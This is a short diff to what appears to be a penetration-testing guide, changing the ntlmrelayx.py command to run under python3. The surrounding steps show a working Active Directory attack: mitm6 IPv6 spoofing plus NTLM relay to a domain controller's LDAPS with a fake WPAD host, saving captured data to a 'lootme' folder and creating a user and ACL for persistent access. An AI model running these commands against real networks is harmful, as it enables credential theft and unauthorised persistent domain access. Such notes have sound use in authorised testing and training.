@@ -50,7 +50,7 @@ sudo python mitm6.py -d <domain>.local
 5. run ntmlrelayx.py at the same time
 Download from: https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py
 ```
-ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
+python3 ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
 ```
 6. check on results:
 all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
